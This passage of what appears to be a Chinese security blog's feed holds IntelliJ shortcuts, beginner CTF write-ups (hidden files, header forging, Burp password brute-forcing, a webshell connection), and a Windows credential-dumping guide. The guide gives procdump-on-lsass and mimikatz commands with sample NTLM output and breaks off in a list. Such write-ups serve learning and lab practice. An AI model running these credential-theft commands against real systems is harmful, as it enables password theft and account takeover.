        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>IDea：<br>Alt+回车 导入包,自动修正<br>Ctrl+N  查找类<br>Ctrl+Shift+N 查找文件<br>Ctrl+Alt+L  格式化代码<br>Ctrl+Alt+O 优化导入的类和包<br>Alt+Insert 生成代码(如get,set方法,构造函数等)<br>Ctrl+E或者Alt+Shift+C  最近更改的代码<br>Ctrl+R 替换文本<br>Ctrl+F 查找文本<br>Ctrl+Shift+Space 自动补全代码<br>Ctrl+空格 代码提示<br>Ctrl+Alt+Space 类名或接口名提示<br>Ctrl+P 方法参数提示<br>Ctrl+Shift+Alt+N 查找类中的方法或变量<br>Alt+Shift+C 对比最近修改的代码</p><p>Shift+F6  重构-重命名<br>Ctrl+Shift+先上键<br>Ctrl+X 删除行<br>Ctrl+D 复制行<br>Ctrl+/ 或 Ctrl+Shift+/  注释（// 或者/<em>…</em>/ ）<br>Ctrl+J  自动代码<br>Ctrl+E 最近打开的文件<br>Ctrl+H 显示类结构图<br>Ctrl+Q 显示注释文档<br>Alt+F1 查找代码所在位置<br>Alt+1 快速打开或隐藏工程面板<br>Ctrl+Alt+ left/right 返回至上次浏览的位置<br>Alt+ left/right 切换代码视图<br>Alt+ Up/Down 在方法间快速移动定位<br>Ctrl+Shift+Up/Down 代码向上/下移动。<br>F2 或Shift+F2 高亮错误或警告快速定位</p><p>代码标签输入完成后，按Tab，生成代码。<br>选中文本，按Ctrl+Shift+F7 ，高亮显示所有该文本，按Esc高亮消失。<br>Ctrl+W 选中代码，连续按会有其他效果<br>选中文本，按Alt+F3 ，逐个往下查找相同文本，并高亮显示。<br>Ctrl+Up/Down 光标跳转到第一行或最后一行下<br>Ctrl+B 快速打开光标处的类或方法</p><p>最常用快捷键<br>1.Ctrl＋E，可以显示最近编辑的文件列表<br>2.Shift＋Click可以关闭文件<br>3.Ctrl＋[或]可以跳到大括号的开头结尾<br>4.Ctrl＋Shift＋Backspace可以跳转到上次编辑的地方<br>5.Ctrl＋F12，可以显示当前文件的结构<br>6.Ctrl＋F7可以查询当前元素在当前文件中的引用，然后按F3可以选择<br>7.Ctrl＋N，可以快速打开类<br>8.Ctrl＋Shift＋N，可以快速打开文件<br>9.Alt＋Q可以看到当前方法的声明<br>10.Ctrl＋W可以选择单词继而语句继而行继而函数<br>11.Alt＋F1可以将正在编辑的元素在各个面板中定位<br>12.Ctrl＋P，可以显示参数信息<br>13.Ctrl＋Shift＋Insert可以选择剪贴板内容并插入<br>14.Alt＋Insert可以生成构造器/Getter/Setter等<br>15.Ctrl＋Alt＋V 可以引入变量。例如把括号内的SQL赋成一个变量<br>16.Ctrl＋Alt＋T可以把代码包在一块内，例如try/catch<br>17.Alt＋Up and Alt＋Down可在方法间快速移动</p><p>下面的不是很有用<br>18.在一些地方按Alt＋Enter可以得到一些Intention Action，例如将”==”改为”equals()”<br>19.Ctrl＋Shift＋Alt＋N可以快速打开符号<br>20.Ctrl＋Shift＋Space在很多时候都能够给出Smart提示<br>21.Alt＋F3可以快速寻找<br>22.Ctrl＋/和Ctrl＋Shift＋/可以注释代码<br>23.Ctrl＋Alt＋B可以跳转到抽象方法的实现<br>24.Ctrl＋O可以选择父类的方法进行重写<br>25.Ctrl＋Q可以看JavaDoc<br>26.Ctrl＋Alt＋Space是类名自动完成<br>27.快速打开类/文件/符号时，可以使用通配符，也可以使用缩写<br>28.Live Templates! Ctrl＋J<br>29.Ctrl＋Shift＋F7可以高亮当前元素在当前文件中的使用<br>30.Ctrl＋Alt＋Up /Ctrl＋Alt＋Down可以快速跳转搜索结果</p><h3 id="特别的"><a href="#特别的" class="headerlink" title="特别的"></a>特别的</h3><p>array.fori</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alt+inster<br><img src="1.png"><br><img src="2.png"></p><p>方法重载：<br>alt+enter<br>！<a href="3.png"></a><br>！<a href="4.png"></a></p><p>sdf.parse(“Fri Jan 17 14:09:32 CST 2020”).var</p><pre><code>    Date parse = sdf.parse(&quot;Fri Jan 17 14:09:32 CST 2020&quot;);</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-misc</title>
      <link href="/2019/10/19/ctf-misc/"/>
      <url>/2019/10/19/ctf-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如来十三掌-菜狗为了打败菜猫，学了一套如来十三掌。<br>与佛论禅”网站，一个编码/解码网站<br>佛曰：……<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/https://q0o0p.top/2019/10/19/ctf-misc/1.png"><br>尝试使用Rot13这个明文的形式,但解密之后还是乱码<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/https://q0o0p.top/2019/10/19/ctf-misc/2.png"></p><p>然后将得到的结果再进行base64解密，得到flag</p><p><img src="https://q0o0p.top/2019/10/19/ctf-misc/3.png"></p><hr><p>pdf-菜猫给了菜狗一张图，说图下面什么都没有</p><p>将图片拖走。。。<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/https://q0o0p.top/2019/10/19/ctf-misc/4.png"></p><p><img src="https://q0o0p.top/2019/10/19/ctf-misc/https://q0o0p.top/2019/10/19/ctf-misc/5.png"><br>得到答案。。。。</p><hr><p>功夫再高也怕菜刀</p><hr><p>对小白的详细补充<br>foremost是一个文件分离和还原的工具<br>foremost的<a href="https://github.com/raddyfiy/foremost">下载</a>及使用<br><a href="http://q0o0p.top/2019/11/19/cft-tool/">http://q0o0p.top/2019/11/19/cft-tool/</a></p><hr><p>用foremost 分离文件，得到一个压缩包，里面有一个加密的flag.txt<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/7.png"><br>然后用wireshark打开文件，分组字节流查找flag.txt<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/8.png"><br><img src="https://q0o0p.top/2019/10/19/ctf-misc/9.png"><br>分组字节流搜索6666.jpg，并追踪TCP流。<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/10.png"><br>找到jpg文件的文件头(FFD8)和文件尾(FFD9)并复制<br>插入到一个十六进制编辑软件中（这个是<a href="https://mh-nexus.de/en/hxd/">HxD Hex Editor</a>），并保存为.jpg的格式<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/11.png"><br><img src="https://q0o0p.top/2019/10/19/ctf-misc/12.png"><br>打开该图片得到密码<br><img src="https://q0o0p.top/2019/10/19/ctf-misc/13.png"><br>然后根据密码打开压缩包，得到flag…</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-web-oneday</title>
      <link href="/2019/10/05/ctf-one/"/>
      <url>/2019/10/05/ctf-one/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><img src="1.png"></p><ol><li>该题目可以用F12查看源代码</li><li>URL地址栏加view-source:  或 Ctrl+u（查看源码快捷键）<br>下方有个被注释的一串字符串，找到flag<br>将注释取消，改为：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;d0d694dd09d7ee5ab0ae4af3d4e7373a&#125;</span><br></pre></td></tr></table></figure>提交<br><img src="2.png"></li></ol><h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>get_post: X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？<br><img src="3.png"><br>打开以后<br><img src="4.png"></p><h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><h3 id="chrome使用postman插件"><a href="#chrome使用postman插件" class="headerlink" title="chrome使用postman插件"></a>chrome使用postman插件</h3><h3 id="火狐插件hackbar（提交post请求）"><a href="#火狐插件hackbar（提交post请求）" class="headerlink" title="火狐插件hackbar（提交post请求）"></a>火狐插件hackbar（提交post请求）</h3><p>F12先点击Load URL然后直接在<a href="http://111.198.29.45:39706/%E5%90%8E%E5%8A%A0">http://111.198.29.45:39706/后加</a> ?a=1<br>然后在勾选Post data 在点击Execute<br><img src="5.png"></p><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>GET传值主要在url后面加个问号然后再传参，然后post一般在火狐浏览器用hackbar传值<br>HTTP协议中共定义了八种方法来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：</p><p>·GET：向特定的资源发出请求。</p><p>·POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</p><p>·OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。</p><p>·HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</p><p>·PUT：向指定资源位置上传其最新内容。</p><p>·DELETE：请求服务器删除Request-URI所标识的资源。</p><p>·TRACE：回显服务器收到的请求，主要用于测试或诊断。</p><p>·CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><h3 id="数据提交到服务器一般有两种方式，GET和POST。"><a href="#数据提交到服务器一般有两种方式，GET和POST。" class="headerlink" title="数据提交到服务器一般有两种方式，GET和POST。"></a>数据提交到服务器一般有两种方式，GET和POST。</h3><p>GET的优点:<br>1.执行效率比POST高。<br>2.可以通过url传递数据，查找数据的时候就会体现到它的好处。</p><p>GET的缺点:<br>1.安全性很低，因为上传的数据都会显示在url上，所以一般用在上传无关紧要的数据上。<br>2.上传的数据量较小，一般不能超过4K.这也是因为url的长度而被限制的。</p><p>POST优点:<br>1.安全性高，但是也不是很高，如果想要高安全性的话就用https传输协议。<br>2.上传的数据量比GET大得多。“理论上讲，POST是没有大小限制的，HTTP协议规范也没有进行大小限制，说“POST数据量存在 80K/100K的大小限制”是不准确的，POST数据是没有限制的，起限制作用的是服务器的处理程序的处理能力。”</p><p>POST缺点:<br>1.执行效率比GET低，但是现在的计算机都很强大，这些几乎可以忽略不计，所以建议一般都使用POST方式。<br>2.不可以通过url传递数据，有时候可能会不方便.</p><p>GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。</p><hr><h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>robots-X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。<br>！<a href="6.png"></a></p><p>f1ag_1s_h3re.php这个页面不允许被爬取<br>查看一下f1ag_1s_h3re.php页面得到正确答案</p><p>扫目录也可以扫到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python python3 dirsearch.py -u http://10.10.10.175:32793/ -e *</span><br></pre></td></tr></table></figure><p>这里我们将下载好的<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>脚本解压后，打开dirsearch.py文件，运行一下，提示需要输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u http://10.10.10.175:32793/ -e *</span><br></pre></td></tr></table></figure><p>在.\reports\111.198.29.45\目录下找到刚输出的文件：<br>打开即可看到扫出的目录和文件。即可看到存在robots.txt文件。<br>HTML访问robots.txt发现f1ag_1s_h3re.php<br>访问robots.txt发现f1ag_1s_h3re.php</p><h3 id="相关介绍："><a href="#相关介绍：" class="headerlink" title="相关介绍："></a>相关介绍：</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>robots协议通常以robots.txt存在，robots.txt文件是一个文本文件，robots.txt是一个协议，而不是一个命令。<br>如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<br>如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<br>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p><hr><p>User-agent: * 这里的代表的所有的搜索引擎种类，是一个通配符<br>Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录<br>Disallow: /require/ 这里定义是禁止爬寻require目录下面的目录<br>Disallow: /ABC/ 这里定义是禁止爬寻ABC目录下面的目录<br>Disallow: /cgi-bin/.htm 禁止访问/cgi-bin/目录下的所有以”.htm”为后缀的URL(包含子目录)。<br>Disallow: /?* 禁止访问网站中所有包含问号 (?) 的网址<br>Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片<br>Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。<br>Allow: /cgi-bin/　这里定义是允许爬寻cgi-bin目录下面的目录<br>Allow: /tmp 这里定义是允许爬寻tmp的整个目录<br>Allow: .htm$ 仅允许访问以”.htm”为后缀的URL。<br>Allow: .gif$ 允许抓取网页和gif格式图片<br>Sitemap: 网站地图 告诉爬虫这个页面是网站地图</p><hr><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>backup-X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧</p><hr><p>常见的备份文件后缀名有: .git .svn .swp  .~ .bak .bash_history（共6种）<br>.bak是备份文件，为文件格式扩展名，这类文件一般在.bak前面加上应该有原来的扩展名比如windows.dll.bak，或是windows_dll.bak，有的则是由原文件的后缀名和bak混合而成</p><hr><p>可以使用扫目录脚本或软件,扫一下,这里使用的是github上的脚本dirsearch,命令行下: py python3 dirsearch.py -u <a href="http://111.198.29.45:47591/">http://111.198.29.45:47591</a> -e *<br>看到存在备份文件index.php.bak访问 <a href="http://10.10.10.175:32770/index.php.bak">http://10.10.10.175:32770/index.php.bak</a></p><p>下载到本地打开，即可看到flag</p><hr><h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p>cookie-X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？</p><hr><h3 id="相关介绍：-1"><a href="#相关介绍：-1" class="headerlink" title="相关介绍："></a>相关介绍：</h3><p>Cookie 在网络系统中几乎无处不在，当我们浏览以前访问过的网站时，网页中可能会出现 ：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。在 Internet 中，Cookie 实际上是指小量信息，是由Web服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。</p><hr><p>F12 -&gt; 存储-&gt; Cookie-&gt; look here-&gt; look here：cookie.php<br>在URL后加上”/cookie.php”即<a href="http://111.198.29.45:47420/cookie.php">http://111.198.29.45:47420/cookie.php</a></p><p> <img src="9.png"></p><p> 控制台-&gt; 消息头-&gt; 找到flag<br> <img src="10.png"></p><hr><h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><p>disabled_button-X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p><hr><p>相关介绍:<br>disabled，借助开发者工具可以删除这些属性，从而让其变得可用</p><p>也可以手动POST相关数据，以下为部分源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">disabled</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-default&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:50px;width:200px;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="于是构造POST请求：auth-flag"><a href="#于是构造POST请求：auth-flag" class="headerlink" title="于是构造POST请求：auth=flag"></a>于是构造POST请求：auth=flag</h2><p>F12，将标签input中的disabled（不可用）属性删除，x掉调试框，点击按钮，即可得到flag。<br><img src="11.png"><br><img src="12.png"></p><hr><h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><p>simple——js-小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )</p><p>F12，找index文件，阅读js代码。（或者ctrl+u :view-source命令）<br><img src="13.png"></p><p>会发现dechiffre返回值与参数pass_enc没有任何关联，返回值是固定的，即不论输入什么都是一样得输出。<br>所以猜测密码在string这一行里。<br>利用python/java代码来求出flag：先将16进制数输出，再将数字（ascii码）转换为对应的字符。</p><hr><h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><p>xff_referer-X老师告诉小宁其实xff和referer是可以伪造的。</p><h3 id="相关介绍：-2"><a href="#相关介绍：-2" class="headerlink" title="相关介绍："></a>相关介绍：</h3><p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><p>xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。</p><p>格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p><hr><p>在Proxy的History里找到目标网页，右键选择发送到repeater。在repeater里查看目标地址内容，添加：X-Forwarded-For:123.123.123.123（这一步是伪造XFF———&gt;go–&gt;收到提示）。<br>或者直接在Proxy的’Intercept is on’里面加上：  X-Forwarded-For:123.123.123.123。<br><img src="14.png"></p><p>Referer:<a href="https://www.google.com(这一步是伪造referer)/">https://www.google.com（这一步是伪造Referer）</a></p><p>也可以直接在Host: 111.198.29.45:40025下面写入：<br>X-Forwarded-For:123.123.123.123<br>Referer:<a href="https://www.google.com/">https://www.google.com</a></p><p><img src="15.png"><br><img src="16.png"></p><hr><h2 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h2><p>weak_auth-小宁写了一个登陆验证页面，随手就设了一个密码。</p><h3 id="相关介绍：-3"><a href="#相关介绍：-3" class="headerlink" title="相关介绍："></a>相关介绍：</h3><p>Intruder是一个定制的高度可配置工具，可以对Web应用程序进行自动化攻击。<br>原理：Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答。在每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload），在不同的位置进行攻击重放，通过应答数据的比对分析获得需要的特征数据。</p><p>github上密码字典：<br><a href="https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a></p><hr><p>F12可以看到：<br><img src="17.png"><br>找到Positions，清楚标记Clear，指针指向password=后面，添加标记Add，如下图所示，将密码放在两个 $pass$ 之间。<br>找到Payloads，加载Load Payload Options，将下载好的字典添加进去。<br>选择左上角startAttack开始爆破。</p><p>登陆以后可以看到:<br>cyberpeace{e255ee279841e7f1eb8f44a420e01870}</p><hr><h2 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h2><p>webshel-小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p><p>看到一句话木马，而且题目描述提示一句话木马放在index.php中。<br>蚂剑（<a href="https://github.com/AntSwordProject/antSword/releases%EF%BC%89">https://github.com/AntSwordProject/antSword/releases）</a></p><p>用菜刀连接:<br><a href="http://111.198.29.45:58974/index.php">http://111.198.29.45:58974/index.php</a></p><hr><p>参考：<a href="https://www.cnblogs.com/kubbycatty/archive/2019/06/27/11100171.html">https://www.cnblogs.com/kubbycatty/archive/2019/06/27/11100171.html</a><br>      <a href="https://blog.csdn.net/qq_43081170/article/details/94717446">https://blog.csdn.net/qq_43081170/article/details/94717446</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows 10 安全常用命令</title>
      <link href="/2019/09/10/windows/"/>
      <url>/2019/09/10/windows/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-windows-10-安全"><a href="#0x01-windows-10-安全" class="headerlink" title="0x01 windows 10 安全"></a>0x01 windows 10 安全</h2><h3 id="1-用户密码存放路径"><a href="#1-用户密码存放路径" class="headerlink" title="1. 用户密码存放路径"></a>1. 用户密码存放路径</h3><p>存放windows账户和密码的文件<code>C:\Windows\System32\config</code></p><p>SAM数据库在磁盘上就保存在%systemroot%system32/config/目<br>录下的sam文件中, 在这个目录下还包括一个security文件，是安全数据库的内容，两者有不少关系。SAM文件(即账号密码数据库文件)，它保存了Windows中所有的用户名和密码<br>录下的sam文件中,SAM数据库中包含所有组、帐户的信息，包括密码HASH、帐户的SID等<br>win+x快速打开powershell (管理员)</p><p>win+R regedt32.exe 打开注册表编辑器并设置适当权限查看SAM中的内容</p><ul><li><p>① 使用wce工具抓取SMA文件下的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -w //读取系统管理员明文密码</span><br><span class="line">wce.exe -l //从内存中读取已经登录的信息,而不是读取Sam数据库中的信息</span><br><span class="line">-c //执行cmd</span><br><span class="line">-v //显示详细</span><br><span class="line">-w //查看已经登录的明文密码</span><br><span class="line">-s //<span class="built_in">hash</span>注入</span><br><span class="line">//<span class="built_in">hash</span>注入具体格式</span><br><span class="line">wce.exe -s 用户名:域名:LM-HASH:NT:HASH</span><br></pre></td></tr></table></figure></li><li><p>② Mimikatz明文密码获取<br>下载链接地址:<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917-fix">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917-fix</a><br>在windows2012以上的系统不能直接获取明文密码了，当可以搭配procdump+mimikatz获取密码。<br>下载<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a></p></li><li><p>先使用procdump<br>管理员模式下运行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="1.png"></p></li><li><p>在使用mimikatz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></li></ul><p>抓取 lsass.exe 中的用户明文密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  //提升权限</span><br><span class="line">sekurlsa::logonpasswords  //抓取密码 @getLogonPasswords</span><br><span class="line"></span><br><span class="line">dll inject::process lsass.exe sekurlsa.dll  //注入</span><br><span class="line">cls-----------------------------清屏</span><br><span class="line"><span class="built_in">exit</span>----------------------------退出</span><br><span class="line">version------------查看mimikatz的版本</span><br><span class="line">system::user-----查看当前登录的系统用户</span><br><span class="line">system::computer-------查看计算机名称</span><br><span class="line">process::list------------------列出进程</span><br><span class="line">process::<span class="built_in">suspend</span> 进程名称 -----暂停进程</span><br><span class="line">process::stop 进程名称---------结束进程</span><br><span class="line">process::modules --列出系统的核心模块及所在位置</span><br><span class="line">service::list---------------列出系统的服务</span><br><span class="line">service::remove-----------移除系统的服务</span><br><span class="line">service::start stop 服务名称--启动或停止服务</span><br><span class="line">privilege::list---------------列出权限列表</span><br><span class="line">privilege::<span class="built_in">enable</span>--------激活一个或多个权限</span><br><span class="line">privilege::debug-----------------提升权限</span><br><span class="line">nogpo::cmd------------打开系统的cmd.exe</span><br><span class="line">nogpo::regedit -----------打开系统的注册表</span><br><span class="line">nogpo::taskmgr-------------打开任务管理器</span><br><span class="line">ts::sessions-----------------显示当前的会话</span><br><span class="line">ts::processes------显示进程和对应的pid情况等</span><br><span class="line">sekurlsa::wdigest-----获取本地用户信息及密码</span><br><span class="line">sekurlsa::tspkg------获取tspkg用户信息及密码</span><br><span class="line">sekurlsa::msv   抓取<span class="built_in">hash</span></span><br><span class="line">sekurlsa::logonPasswords--获登陆用户信息及密码</span><br><span class="line">sekurlsa::ekeys  抓取<span class="built_in">hash</span></span><br></pre></td></tr></table></figure><ul><li>hash-identifier工具<br>判断hash值的加密类型的工具<br>hash-identifier不是hash破解工具，而是用来判断hash值所使用的加密方式。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::minidump lsass.dmp</span></span><br><span class="line">Switch to MINIDUMP : <span class="string">&#x27;lsass.dmp&#x27;</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords full</span></span><br><span class="line">Opening : <span class="string">&#x27;lsass.dmp&#x27;</span> file <span class="keyword">for</span> minidump...</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 546390 (00000000:00085656)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ASUS</span><br><span class="line">Domain            : DESKTOP-1VU9SAK</span><br><span class="line">Logon Server      : DESKTOP-1VU9SAK</span><br><span class="line">Logon Time        : 2020/9/17 19:27:26</span><br><span class="line">SID               : S-1-5-21-4130645680-3826047202-4244527014-1001</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ASUS</span><br><span class="line">         * Domain   : DESKTOP-1VU9SAK</span><br><span class="line">         * NTLM     : f4b3f4cac5a37bb20a2b30ee1b3f84d9</span><br><span class="line">         * SHA1     : 56a7be908df7b5af37d45d6afa1e34af1ed9fe03</span><br><span class="line">        tspkg :</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>Findmyhash工具<br>在线哈希破解工具，借助在线破解哈希网站的接口制作的工具，要知道hash值的类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findmyhash MD5 -h 777bbb7869ae8193249f8ff7d3e59afe</span><br></pre></td></tr></table></figure></li><li><p>③ Getpass 明文密码获取</p></li><li><p>④ Saminside 字典爆破</p></li><li><p>⑤ Ophcrack 加载彩虹表爆破</p></li></ul><hr><p>修改权限：<br><a href="http://www.xitongcheng.com/jiaocheng/win10_article_11581.html">http://www.xitongcheng.com/jiaocheng/win10_article_11581.html</a></p><hr><p>0x02 常用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 